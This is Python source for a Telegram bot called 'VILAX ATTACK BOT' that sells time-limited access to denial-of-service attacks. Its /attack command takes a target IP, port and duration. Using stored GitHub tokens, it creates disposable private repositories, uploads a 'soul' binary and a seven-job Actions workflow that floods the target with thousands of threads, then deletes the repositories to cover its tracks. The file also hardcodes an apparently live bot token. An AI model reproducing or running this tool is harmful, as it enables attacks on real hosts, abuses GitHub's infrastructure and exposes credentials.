import os
import json
import time
import random
import string
import base64
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List

import requests
import yaml
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ---------------- Configuration ----------------
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "7699923377:AAHE3o1WK80DiROSrSpNql8Yx6yVjMxoLgw")
DEVELOPER_TAG = "@VILAXLORD"

# Owner and admin control
OWNER_IDS = {5406953620}
ADMINS_FILE = "admins.json"
USERS_FILE = "users.json"
TOKENS_FILE = "tokens.txt"
TOKENS_STATUS_FILE = "tokens.json"

BINARY_NAME = "soul"
BINARY_PATH = os.path.join(os.getcwd(), BINARY_NAME)
DEFAULT_THREADS_FILE = "threads.json"

# Track running attacks per chat
ATTACK_STATUS: Dict[int, Dict[str, Any]] = {}

# ---------------- Utilities ----------------
def load_json(path: str, default: Any) -> Any:
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default

def save_json(path: str, data: Any) -> None:
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def set_default_threads(value: int) -> None:
    save_json(DEFAULT_THREADS_FILE, {"threads": int(value)})

def get_default_threads() -> int:
    data = load_json(DEFAULT_THREADS_FILE, {"threads": 4000})
    return int(data.get("threads", 4000))

def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

def get_admins() -> set:
    data = load_json(ADMINS_FILE, {"admins": []})
    return set(data.get("admins", []))

def is_admin(user_id: int) -> bool:
    return is_owner(user_id) or user_id in get_admins()

def add_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.add(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def remove_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.discard(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def get_users() -> Dict[str, Dict[str, str]]:
    return load_json(USERS_FILE, {})

def is_user_approved(user_id: int) -> bool:
    users = get_users()
    info = users.get(str(user_id))
    if not info:
        return False
    try:
        expires = datetime.fromisoformat(info["expires"].replace("Z", "+00:00"))
        return datetime.utcnow().astimezone(expires.tzinfo) <= expires
    except Exception:
        return False

def add_user(user_id: int, days: int) -> None:
    users = get_users()
    expires = datetime.utcnow() + timedelta(days=int(days))
    users[str(user_id)] = {"expires": expires.replace(microsecond=0).isoformat() + "Z"}
    save_json(USERS_FILE, users)

def remove_user(user_id: int) -> None:
    users = get_users()
    users.pop(str(user_id), None)
    save_json(USERS_FILE, users)

def rand_repo_name(prefix="soul-run") -> str:
    return f"{prefix}-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def build_matrix_workflow_yaml(ip: str, port: str, duration: str, threads: int) -> str:
    wf = {
        "name": "Matrix 7 runs",
        "on": {"workflow_dispatch": {}},
        "jobs": {
            "run-soul": {
                "runs-on": "ubuntu-latest",
                "strategy": {"fail-fast": False, "matrix": {"session": [1, 2, 3, 4, 5, 6, 7]}},
                "steps": [
                    {"name": "Checkout", "uses": "actions/checkout@v4"},
                    {"name": "Make executable", "run": f"chmod 755 {BINARY_NAME}"},
                    {"name": "Run soul", "run": f"./{BINARY_NAME} {ip} {port} {duration} {threads}"}
                ]
            }
        }
    }
    return yaml.safe_dump(wf, sort_keys=False)

def gh_headers(token: str) -> Dict[str, str]:
    return {"Authorization": f"token {token}", "Accept": "application/vnd.github+json"}

def gh_create_repo(token: str, name: str) -> Optional[Dict[str, Any]]:
    r = requests.post(
        "https://api.github.com/user/repos",
        headers=gh_headers(token),
        json={"name": name, "private": True, "auto_init": False},
        timeout=30
    )
    return r.json() if r.status_code in (201, 202) else None

def gh_delete_repo(token: str, full_name: str) -> bool:
    r = requests.delete(
        f"https://api.github.com/repos/{full_name}",
        headers=gh_headers(token),
        timeout=30
    )
    return r.status_code == 204

def gh_put_file(token: str, owner: str, repo: str, path: str, content_bytes: bytes, message: str) -> bool:
    b64 = base64.b64encode(content_bytes).decode()
    r = requests.put(
        f"https://api.github.com/repos/{owner}/{repo}/contents/{path}",
        headers=gh_headers(token),
        json={"message": message, "content": b64},
        timeout=30
    )
    return r.status_code in (201, 200)

def gh_dispatch_workflow(token: str, owner: str, repo: str, workflow_file: str, ref: str = "main") -> bool:
    r = requests.post(
        f"https://api.github.com/repos/{owner}/{repo}/actions/workflows/{workflow_file}/dispatches",
        headers=gh_headers(token),
        json={"ref": ref},
        timeout=30
    )
    return r.status_code in (204, 201)

def validate_github_token(token: str) -> bool:
    r = requests.get(
        "https://api.github.com/user",
        headers=gh_headers(token),
        timeout=20
    )
    return r.status_code == 200

def save_token_line(uid: int, token: str) -> None:
    with open(TOKENS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid}:{token}\n")

def load_all_token_lines() -> List[str]:
    if not os.path.exists(TOKENS_FILE):
        return []
    with open(TOKENS_FILE, "r", encoding="utf-8") as f:
        return [ln.strip() for ln in f if ":" in ln]

def remove_token(token_to_remove: str) -> bool:
    if not os.path.exists(TOKENS_FILE):
        return False
    
    lines = load_all_token_lines()
    new_lines = [line for line in lines if token_to_remove not in line.split(":", 1)[1]]
    
    if len(new_lines) == len(lines):
        return False
    
    with open(TOKENS_FILE, "w", encoding="utf-8") as f:
        for line in new_lines:
            f.write(line + "\n")
    return True

def get_all_valid_tokens() -> List[str]:
    """Get all valid tokens from tokens file"""
    lines = load_all_token_lines()
    valid_tokens = []
    
    for line in lines:
        try:
            _, token = line.split(":", 1)
            if validate_github_token(token):
                valid_tokens.append(token)
        except Exception:
            continue
    
    return valid_tokens

def set_status(chat_id: int, running: bool, until: Optional[datetime], repos: Optional[List[str]]) -> None:
    ATTACK_STATUS[chat_id] = {"running": running, "until": until, "repos": repos}

def get_status(chat_id: int) -> Dict[str, Any]:
    return ATTACK_STATUS.get(chat_id, {"running": False, "until": None, "repos": []})

async def animate_progress(context: ContextTypes.DEFAULT_TYPE, chat_id: int, text: str, frames: List[str], delay: float = 0.4):
    msg = await context.bot.send_message(chat_id=chat_id, text=text)
    for fr in frames:
        await asyncio.sleep(delay)
        try:
            await msg.edit_text(fr)
        except Exception:
            pass
    return msg

def anime_gif_url() -> str:
    return "https://media.tenor.com/2RoHfo7f0hUAAAAC/anime-wave.gif"

# ---------------- Handlers ----------------
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    welcome = f"""
✨ **Welcome to VILAX ATTACK BOT!** ✨

🚀 *Powerful GitHub Actions Attack Bot*
⚡ *High Performance | Multi-Token Support*
🛡️ *Secure & Private*

📖 **Use /help to see all commands**
🔧 **Developer**: {DEVELOPER_TAG}

🌟 *Ready to launch attacks!* 🌟
    """.strip()
    
    await context.bot.send_message(chat_id=chat_id, text=welcome, parse_mode='Markdown')
    
    try:
        await context.bot.send_animation(
            chat_id=chat_id, 
            animation=anime_gif_url(), 
            caption="🎮 **Bot Activated Successfully!** 🎮"
        )
    except Exception:
        pass

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_admin(user_id):
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛠️ Admin Panel", callback_data="admin_panel")]])
        text = """
🤖 **BOT COMMANDS** 🤖

👤 **User Commands:**
🔹 /start - Start the bot 🚀
🔹 /help - Show this help menu 📖
🔹 /ping - Check bot latency 🏓
🔹 /status - Check attack status 📊
🔹 /attack - Launch attack ⚡

🛠️ **Admin Commands:**
🔸 /users - View approved users 👥
🔸 /check - Check token status 🔍
🔸 /add - Add user approval ✅
🔸 /remove - Remove user ❌
🔸 /threads - Set default threads 🧵
🔸 /file - Upload binary 📁

👑 **Owner Commands:**
🔺 /addadmin - Add admin 👨‍💼
🔺 /removeadmin - Remove admin 👨‍💼
🔺 /githubstatus - Token statistics 📈
🔺 /settoken - Add GitHub tokens 🔑
🔺 /removetoken - Remove bad token 🗑️

💡 *Click button below for admin panel!*
        """.strip()
        await update.message.reply_text(text, reply_markup=kb, parse_mode='Markdown')
    else:
        text = """
🤖 **BOT COMMANDS** 🤖

🔹 /start - Start the bot 🚀
🔹 /help - Show help menu 📖
🔹 /ping - Check bot latency 🏓
🔹 /status - Check attack status 📊
🔹 /attack - Launch attack ⚡

📞 *Contact {DEVELOPER_TAG} for access*
        """.strip().format(DEVELOPER_TAG=DEVELOPER_TAG)
        await update.message.reply_text(text, parse_mode='Markdown')
    
    try:
        await context.bot.send_animation(
            chat_id=update.effective_chat.id, 
            animation=anime_gif_url(), 
            caption="📚 **Help Menu Delivered!** 📚"
        )
    except Exception:
        pass

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if q.data == "admin_panel":
        await q.edit_message_text(
            "🛠️ **ADMIN PANEL** 🛠️\n\n"
            "👥 User Management:\n"
            "🔸 /add userid days\n"
            "🔸 /remove userid\n\n"
            "⚙️ Bot Settings:\n"
            "🔸 /threads N\n"
            "🔸 /file\n\n"
            "📊 Monitoring:\n"
            "🔸 /users\n"
            "🔸 /check\n\n"
            "👑 Owner Only:\n"
            "🔺 /addadmin userid\n"
            "🔺 /removeadmin userid\n"
            "🔺 /githubstatus\n"
            "🔺 /settoken\n"
            "🔺 /removetoken",
            parse_mode='Markdown'
        )

async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    t0 = time.time()
    msg = await update.message.reply_text("🏓 Pinging...")
    dt = int((time.time() - t0) * 1000)
    try:
        await msg.edit_text(f"🏓 **Pong!** `{dt} ms` ⚡", parse_mode='Markdown')
    except Exception:
        pass

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    st = get_status(update.effective_chat.id)
    if st["running"]:
        endt = st["until"].isoformat() if st["until"] else "unknown"
        repo_count = len(st["repos"]) if st["repos"] else 0
        await update.message.reply_text(
            f"⚡ **Attack Running!** ⚡\n\n"
            f"📦 Repositories: `{repo_count}`\n"
            f"⏰ Ends: `{endt}`\n"
            f"🔥 Status: **ACTIVE**",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("💤 **No attack running.** 😴", parse_mode='Markdown')

async def cmd_githubstatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show GitHub token statistics - Owner only"""
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text(f"❌ **Owner Only Command!** 👑\n\nContact {DEVELOPER_TAG}", parse_mode='Markdown')
        return
    
    msg = await update.message.reply_text("🔍 **Checking GitHub Tokens...** 📊")
    
    lines = load_all_token_lines()
    if not lines:
        await msg.edit_text("📭 **No tokens found!** ❌\n\nUse /settoken to add tokens.")
        return
    
    user_token_count = {}
    live_tokens = 0
    dead_tokens = 0
    detailed_status = {}
    
    for line in lines:
        try:
            user_id, token = line.split(":", 1)
            user_token_count[user_id] = user_token_count.get(user_id, 0) + 1
            
            alive = validate_github_token(token)
            if alive:
                live_tokens += 1
            else:
                dead_tokens += 1
                
            # Store detailed status for display
            if user_id not in detailed_status:
                detailed_status[user_id] = {"live": 0, "dead": 0}
            if alive:
                detailed_status[user_id]["live"] += 1
            else:
                detailed_status[user_id]["dead"] += 1
                
        except Exception:
            continue
    
    total_tokens = len(lines)
    
    # Build detailed status text
    status_text = f"""
📊 **GITHUB TOKEN STATUS** 📊

👥 **User Statistics:**
🔸 Total Users: `{len(user_token_count)}`
🔸 Total Tokens: `{total_tokens}`

✅ **Token Health:**
🔸 Live Tokens: `{live_tokens}` 🟢
🔸 Dead Tokens: `{dead_tokens}` 🔴
🔸 Success Rate: `{(live_tokens/total_tokens)*100:.1f}%` 📈

👑 **Detailed User Breakdown:**
"""
    
    for user_id, counts in detailed_status.items():
        status_text += f"🔹 User `{user_id}`: 🟢 {counts['live']} | 🔴 {counts['dead']}\n"
    
    status_text += "\n💡 Use `/check` for detailed token-by-token analysis"
    status_text += "\n🗑️ Use `/removetoken` to remove bad tokens"
    
    try:
        await msg.edit_text(status_text, parse_mode='Markdown')
    except Exception:
        await update.message.reply_text(status_text, parse_mode='Markdown')

async def cmd_removetoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a specific token - Owner only"""
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text(f"❌ **Owner Only Command!** 👑\n\nContact {DEVELOPER_TAG}", parse_mode='Markdown')
        return
    
    if not context.args:
        await update.message.reply_text(
            "🗑️ **Remove GitHub Token** 🗑️\n\n"
            "Usage: `/removetoken token_part`\n"
            "Example: `/removetoken ghp_abc123`\n\n"
            "💡 *Provide part of the token to remove*",
            parse_mode='Markdown'
        )
        return
    
    token_part = context.args[0].strip()
    msg = await update.message.reply_text(f"🔍 **Searching for token...** `{token_part}`")
    
    if remove_token(token_part):
        await msg.edit_text(f"✅ **Token Removed Successfully!** 🗑️\n\nToken part: `{token_part}`", parse_mode='Markdown')
    else:
        await msg.edit_text(f"❌ **Token Not Found!** 🔍\n\nNo token containing: `{token_part}`", parse_mode='Markdown')

async def cmd_settoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add GitHub tokens - Owner only"""
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text(f"❌ **Owner Only Command!** 👑\n\nContact {DEVELOPER_TAG}", parse_mode='Markdown')
        return
    
    # .txt document
    if update.message.document and update.message.document.file_name.endswith(".txt"):
        file = await update.message.document.get_file()
        path = await file.download_to_drive()
        cnt = 0
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                tok = line.strip()
                if tok:
                    save_token_line(uid, tok)
                    cnt += 1
        os.remove(path)
        msg = await update.message.reply_text(f"✅ **Saved {cnt} token(s)!** 🔑\n\nPreparing setup... ⚙️")
    else:
        # token(s) as text
        text = update.message.text.replace("/settoken", "").strip() if update.message.text else ""
        if not text:
            await update.message.reply_text(
                "🔑 **Add GitHub PAT** 🔑\n\n"
                "Send token in message or upload .txt file\n"
                "Format: One token per line\n\n"
                "💡 *Personal Access Token required*"
            )
            return
        tokens = [t.strip() for t in text.split() if t.strip()]
        for tok in tokens:
            save_token_line(uid, tok)
        msg = await update.message.reply_text(f"✅ **Saved {len(tokens)} token(s)!** 🔑\n\nSetting up... ⚙️")

    # Progress animation
    frames = [
        "🔄 Creating repo... ███▒▒▒▒▒▒▒▒",
        "📁 Adding binary... █████▒▒▒▒▒▒", 
        "⚡ Ready!... ████████████"
    ]
    for fr in frames:
        await asyncio.sleep(0.6)
        try:
            await msg.edit_text(fr)
        except Exception:
            pass
    try:
        await msg.edit_text("🎉 **Setup Complete!** ✅\n\nTokens added successfully! 🔑", parse_mode='Markdown')
    except Exception:
        pass

async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"❌ **Admin Only!** 🛡️\n\nContact {DEVELOPER_TAG}")
        return
    
    users = get_users()
    if not users:
        await update.message.reply_text("📭 **No approved users found!** 👥")
        return
    
    # Build readable user list
    user_list = "📊 **APPROVED USERS** 📊\n\n"
    
    for user_id, user_info in users.items():
        try:
            expires = datetime.fromisoformat(user_info["expires"].replace("Z", "+00:00"))
            remaining = expires - datetime.utcnow().astimezone(expires.tzinfo)
            days_left = remaining.days
            hours_left = remaining.seconds // 3600
            
            status = "🟢 ACTIVE" if days_left > 0 else "🔴 EXPIRED"
            user_list += f"👤 **User {user_id}:**\n"
            user_list += f"   📅 Expires: {expires.strftime('%Y-%m-%d %H:%M')}\n"
            user_list += f"   ⏳ Remaining: {days_left}d {hours_left}h\n"
            user_list += f"   🔰 Status: {status}\n\n"
            
        except Exception:
            user_list += f"👤 **User {user_id}:** ❌ Invalid expiry date\n\n"
    
    await update.message.reply_text(user_list, parse_mode='Markdown')

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = await update.message.reply_text("🔍 **Checking tokens...** ⏳")
    
    lines = load_all_token_lines()
    if not lines:
        await msg.edit_text("📭 **No tokens found!** ❌")
        return

    if is_admin(uid):
        # Admin/Owner - All tokens detailed view
        user_tokens = {}
        live_count = 0
        dead_count = 0
        
        for line in lines:
            try:
                user_id, token = line.split(":", 1)
                alive = validate_github_token(token)
                
                if user_id not in user_tokens:
                    user_tokens[user_id] = []
                
                status = "🟢 LIVE" if alive else "🔴 DEAD"
                user_tokens[user_id].append(f"`{token[:12]}...` : {status}")
                
                if alive:
                    live_count += 1
                else:
                    dead_count += 1
                    
            except Exception:
                continue

        # Build readable text
        result_text = "📊 **ALL TOKENS STATUS** 📊\n\n"
        
        for user_id, tokens in user_tokens.items():
            result_text += f"👤 **User {user_id}:**\n"
            for token_status in tokens:
                result_text += f"   {token_status}\n"
            result_text += "\n"
        
        result_text += f"📈 **SUMMARY:** 🟢 {live_count} LIVE | 🔴 {dead_count} DEAD\n\n"
        result_text += "🗑️ Use `/removetoken token_part` to remove dead tokens"
        
        try:
            await msg.edit_text(result_text, parse_mode='Markdown')
        except Exception:
            # If message too long, send as multiple messages
            await msg.delete()
            chunks = [result_text[i:i+4000] for i in range(0, len(result_text), 4000)]
            for chunk in chunks:
                await update.message.reply_text(chunk, parse_mode='Markdown')
                
    else:
        # Normal user - Only their tokens
        own_tokens = [ln.split(":", 1)[1] for ln in lines if ln.startswith(f"{uid}:")]
        live = dead = 0
        rows = []
        
        for token in own_tokens:
            alive = validate_github_token(token)
            if alive:
                live += 1
                rows.append(f"`{token[:12]}...` : 🟢 LIVE")
            else:
                dead += 1
                rows.append(f"`{token[:12]}...` : 🔴 DEAD")
        
        if not rows:
            await msg.edit_text("❌ **No tokens found for your account!**")
            return
            
        result_text = "🔑 **YOUR TOKENS STATUS** 🔑\n\n"
        result_text += "\n".join(rows)
        result_text += f"\n\n📈 **SUMMARY:** 🟢 {live} LIVE | 🔴 {dead} DEAD"
        
        try:
            await msg.edit_text(result_text, parse_mode='Markdown')
        except Exception:
            await update.message.reply_text(result_text, parse_mode='Markdown')

async def cmd_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"❌ **Admin Only!** 🛡️\n\nContact {DEVELOPER_TAG}")
        return
    if len(context.args) != 2:
        await update.message.reply_text("📝 **Usage:** `/add userid days` ⏰", parse_mode='Markdown')
        return
    try:
        target = int(context.args[0])
        days = int(context.args[1])
        add_user(target, days)
        await update.message.reply_text(f"✅ **Approved!** 👤\n\nUser `{target}` for `{days}` days 🎉", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ **Invalid input!** 🤔\n\nUserID and days must be numbers 🔢")

async def cmd_remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"❌ **Admin Only!** 🛡️\n\nContact {DEVELOPER_TAG}")
        return
    if len(context.args) != 1:
        await update.message.reply_text("📝 **Usage:** `/remove userid` ❌", parse_mode='Markdown')
        return
    try:
        target = int(context.args[0])
        remove_user(target)
        await update.message.reply_text(f"✅ **Removed!** 👤\n\nUser `{target}` access revoked 🗑️", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ **Invalid UserID!** 🤔\n\nMust be a number 🔢")

async def cmd_addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text(f"❌ **Owner Only!** 👑\n\nContact {DEVELOPER_TAG}")
        return
    if len(context.args) != 1:
        await update.message.reply_text("📝 **Usage:** `/addadmin userid` 👨‍💼", parse_mode='Markdown')
        return
    try:
        target = int(context.args[0])
        add_admin(target)
        await update.message.reply_text(f"✅ **Admin Added!** 👨‍💼\n\nUser `{target}` is now admin 🎉", parse_mode='Markdown')
    except Exception:
        await update.message.reply_text("❌ **Invalid UserID!** 🤔\n\nMust be a number 🔢")

async def cmd_removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text(f"❌ **Owner Only!** 👑\n\nContact {DEVELOPER_TAG}")
        return
    if len(context.args) != 1:
        await update.message.reply_text("📝 **Usage:** `/removeadmin userid` 👨‍💼", parse_mode='Markdown')
        return
    try:
        target = int(context.args[0])
        remove_admin(target)
        await update.message.reply_text(f"✅ **Admin Removed!** 👨‍💼\n\nUser `{target}` admin rights revoked 🗑️", parse_mode='Markdown')
    except Exception:
        await update.message.reply_text("❌ **Invalid UserID!** 🤔\n\nMust be a number 🔢")

async def cmd_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"❌ **Admin Only!** 🛡️\n\nContact {DEVELOPER_TAG}")
        return
    if not context.args:
        await update.message.reply_text("📝 **Usage:** `/threads 4000` 🧵", parse_mode='Markdown')
        return
    try:
        val = int(context.args[0])
        set_default_threads(val)
        await update.message.reply_text(f"✅ **Threads Updated!** 🧵\n\nDefault threads set to `{val}` ⚡", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ **Invalid number!** 🤔\n\nMust be a valid number 🔢")

async def cmd_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"❌ **Admin Only!** 🛡️\n\nContact {DEVELOPER_TAG}")
        return
    await update.message.reply_text(f"📁 **Upload binary named** `{BINARY_NAME}` **now.** ⬆️", parse_mode='Markdown')

async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc:
        return
    if doc.file_name == BINARY_NAME:
        if os.path.exists(BINARY_PATH):
            os.remove(BINARY_PATH)
        f = await doc.get_file()
        await f.download_to_drive(custom_path=BINARY_PATH)
        await update.message.reply_text(f"✅ **Binary Saved!** 📁\n\n`{BINARY_NAME}` saved successfully 🎉", parse_mode='Markdown')

async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    chat_id = update.effective_chat.id
    if not is_user_approved(uid):
        await update.message.reply_text(f"❌ **Not Authorized!** 🚫\n\nContact {DEVELOPER_TAG}")
        return
    if len(context.args) != 3:
        await update.message.reply_text("📝 **Usage:** `/attack ip port duration` ⚡", parse_mode='Markdown')
        return
    ip, port, duration = context.args
    try:
        int(port)
        int(duration)
    except ValueError:
        await update.message.reply_text("❌ **Invalid input!** 🤔\n\nPort and duration must be numbers 🔢")
        return
    if not os.path.exists(BINARY_PATH):
        await update.message.reply_text(f"❌ **Binary Missing!** 📁\n\n`{BINARY_NAME}` not found. Admin must upload via /file", parse_mode='Markdown')
        return

    # Get ALL valid tokens from the system (not just user's tokens)
    valid_tokens = get_all_valid_tokens()
    if not valid_tokens:
        await update.message.reply_text("❌ **No Valid Tokens Found in System!** 🔑\n\nOwner must add tokens via /settoken")
        return

    msg = await update.message.reply_text(f"🚀 **Starting attack with** `{len(valid_tokens)}` **system token(s)...** ⚡", parse_mode='Markdown')
    threads = get_default_threads()
    wf_text = build_matrix_workflow_yaml(ip, port, duration, threads).encode()
    repos = []
    failed_tokens = []

    for token in valid_tokens:
        try:
            await msg.edit_text(f"🔄 Creating repo for `{token[:10]}...` 📁")
            name = rand_repo_name()
            repo_data = gh_create_repo(token, name)
            if not repo_data:
                failed_tokens.append(token[:10] + "…")
                continue
            full_name = repo_data["full_name"]
            owner, repo = full_name.split("/", 1)
            repos.append((token, full_name))

            await msg.edit_text(f"📁 Uploading workflow for `{full_name}` ⚙️")
            ok_wf = gh_put_file(token, owner, repo, ".github/workflows/run.yml", wf_text, "Add workflow")
            if not ok_wf:
                failed_tokens.append(token[:10] + "…")
                gh_delete_repo(token, full_name)
                continue

            await msg.edit_text(f"📦 Uploading binary for `{full_name}` 🚀")
            with open(BINARY_PATH, "rb") as bf:
                soul_bytes = bf.read()
            ok_bin = gh_put_file(token, owner, repo, BINARY_NAME, soul_bytes, "Add binary")
            if not ok_bin:
                failed_tokens.append(token[:10] + "…")
                gh_delete_repo(token, full_name)
                continue

            await msg.edit_text(f"⚡ Dispatching workflow for `{full_name}` 🎯")
            if not gh_dispatch_workflow(token, owner, repo, "run.yml", "main"):
                failed_tokens.append(token[:10] + "…")
                gh_delete_repo(token, full_name)
                continue

        except Exception as e:
            failed_tokens.append(token[:10] + "…")
            await msg.edit_text(f"❌ Error with token `{token[:10]}...`: `{str(e)}`", parse_mode='Markdown')
            continue

    if not repos:
        await msg.edit_text(f"❌ **Attack Failed!** 💥\n\nNo successful setups. Failed tokens: `{', '.join(failed_tokens) or 'None'}`", parse_mode='Markdown')
        return

    until = datetime.utcnow() + timedelta(seconds=int(duration) + 15)
    set_status(chat_id, True, until, [r[1] for r in repos])
    started = f"🎯 **Attack Launched!** ⚡\n\nTarget: `{ip}:{port}`\nDuration: `{duration}s`\nTokens: `{len(repos)}`\nThreads: `{threads}`\n\n🔥 **VILAX MODE ACTIVATED!** 🔥"
    try:
        await msg.edit_text(started, parse_mode='Markdown')
    except Exception:
        await update.message.reply_text(started, parse_mode='Markdown')

    total = int(duration)
    ticks = max(1, total // 5)
    for i in range(1, 6):
        await asyncio.sleep(ticks)
        try:
            await msg.edit_text(f"⚡ **Running...** `{ip}:{port}` ~`{i * 20}%` (`{len(repos)}` repos) 📊", parse_mode='Markdown')
        except Exception:
            pass

    try:
        await msg.edit_text(
            f"✅ **Attack Complete!** 🎉\n\n"
            f"Tokens Used: `{len(repos)}` 🟢\n"
            f"Failed Tokens: `{', '.join(failed_tokens) or 'None'}` 🔴\n"
            f"Target: `{ip}:{port}` 🎯",
            parse_mode='Markdown'
        )
    except Exception:
        await update.message.reply_text(
            f"✅ **Attack Complete!** 🎉\n\n"
            f"Tokens Used: `{len(repos)}` 🟢\n"
            f"Failed Tokens: `{', '.join(failed_tokens) or 'None'}` 🔴",
            parse_mode='Markdown'
        )

    for token, full_name in repos:
        try:
            gh_delete_repo(token, full_name)
        except Exception:
            pass
    set_status(chat_id, False, None, [])

def main():
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not set!")
        return

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("ping", cmd_ping))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("githubstatus", cmd_githubstatus))
    app.add_handler(CommandHandler("removetoken", cmd_removetoken))
    app.add_handler(CommandHandler("settoken", cmd_settoken))
    app.add_handler(CommandHandler("users", cmd_users))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("add", cmd_add))
    app.add_handler(CommandHandler("remove", cmd_remove))
    app.add_handler(CommandHandler("addadmin", cmd_addadmin))
    app.add_handler(CommandHandler("removeadmin", cmd_removeadmin))
    app.add_handler(CommandHandler("threads", cmd_threads))
    app.add_handler(CommandHandler("file", cmd_file))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_handler(CallbackQueryHandler(on_button))

    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
